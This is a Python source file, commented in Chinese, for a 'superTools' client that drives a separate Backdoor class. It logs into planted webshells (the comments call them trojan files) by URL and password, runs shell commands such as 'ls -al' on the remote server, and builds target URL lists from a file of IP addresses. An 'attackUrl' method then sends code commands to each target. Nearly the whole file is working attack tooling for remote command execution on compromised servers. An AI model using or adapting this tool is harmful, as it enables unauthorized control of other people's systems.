import requests
from requests.exceptions import RequestException
import re
import Backdoor_class


class superTools:
    def __init__(self):
        # 创建Backdoor类的实例
        self.backdoor = Backdoor_class.Backdoor()

    def initialization(self, Url: str, password: str) -> None:
        """
        初始化 Backdoor 实例。

        该方法用于初始化 Backdoor 实例，并设置其 URL 和密码属性。

        Args:
            Url (str): 要设置的 URL 字符串。
            password (str): 要设置的密码字符串。

        Returns:
            None

        Example:
            示例用法:
            - 调用 `initialization(Url, password)` 方法来初始化 Backdoor 实例，并设置 URL 和密码属性。
        """
        self.backdoor.setUrl(Url)
        self.backdoor.setanalyzeUrl()
        self.backdoor.setPassword(password)
        self.backdoor.printALLAttribute()
        print("\n" * 3)

    def testUrl(self, timeoutValue: int = 2) -> None:
        """
        测试 URL 连接并执行系统命令。

        该方法用于测试 URL 连接是否成功，并执行预定义的系统命令。方法将发送 POST 请求，
        并检查响应状态码和响应内容以确定连接是否成功，以及系统命令是否执行成功。

        Args:
            timeoutValue (int): 连接超时时间，单位为秒。默认为 2 秒。

        Returns:
            None

        Example:
            示例用法:
            - 调用 `testUrl()` 方法来测试 URL 连接和执行系统命令。
        """
        try:
            self.backdoor.setSystemCmd_PostValue("ls -al")
            # 发送HTTP请求，设置连接超时为指定时间
            response = requests.post(
                self.backdoor.Url, data=self.backdoor.post_data, timeout=timeoutValue)

            # 检查响应状态码
            if response.status_code != 200:
                print("连接失败")
            print('---------------------响应---------------------')
            print(response.text)
            if not response.text:
                print('------------------密码错误-------------------')
            if self.backdoor.file_name in response.text:
                # 自动检测时响应中包含连接文件则代表成功，否则失败
                print('------------------连接成功-------------------')
            else:
                print('--------------自行检查是否成功---------------')

        # 错误响应
        except RequestException as e:
            if "timeout" in str(e):
                print("连接失败: 失败原因连接时间过长，可能不存在该木马文件")
            else:
                print("连接失败:", str(e))

    def executeSystemCommand(self, systemCmd, timeoutValue: int = 2) -> None:
        try:
            self.backdoor.setSystemCmd_PostValue(systemCmd)
            # 发送HTTP请求，设置连接超时为指定时间
            response = requests.post(
                self.backdoor.Url, data=self.backdoor.post_data, timeout=timeoutValue)
            # 检查响应状态码
            if response.status_code != 200:
                print("连接失败")
            print('---------------------响应---------------------')
            print(response.text)
            print('----------------------------------------------')
        except RequestException as e:
            if "timeout" in str(e):
                print("执行失败: 失败原因连接时间过长")
            else:
                print("执行失败:", str(e))

    def getUrl(self, fileAddress=""):
        """
        根据提供的文件地址，生成对应的 URL 列表。

        Args:
            fileAddress (str): 包含 IP 地址的文件地址。

        Returns:
            list: 包含所有 IP 地址对应的 URL 的列表。

        Example:
            示例用法:
            - 调用 `getUrl(fileAddress)` 方法来生成 URL 列表。
        """
        # 获取文件中的 IP 地址列表
        self.backdoor.getFileAddress(fileAddress)

        urls = []  # 用于存储所有 URL 的列表

        for ip in self.backdoor.readIPs():
            url = self.backdoor.splice_IP_Url(ip)
            urls.append(url)  # 将生成的 URL 添加到列表中

        return urls  # 返回包含所有 IP 地址对应的 URL 的列表

    def attackUrl(self, Url, codeCmd, password="", timeoutValue: int = 2):
        try:
            self.backdoor.setCodeCmd(codeCmd)
            # 发送HTTP请求，设置连接超时为指定时间
            response = requests.post(
                Url, data=self.backdoor.post_data, timeout=timeoutValue)
            # 检查响应状态码
            if response.status_code != 200:
                print("连接失败")
            print('---------------------响应---------------------')
            print(response.text)
            print('----------------------------------------------')
        except RequestException as e:
            if "timeout" in str(e):
                print("执行失败: 失败原因连接时间过长")
            else:
                print("执行失败:", str(e))
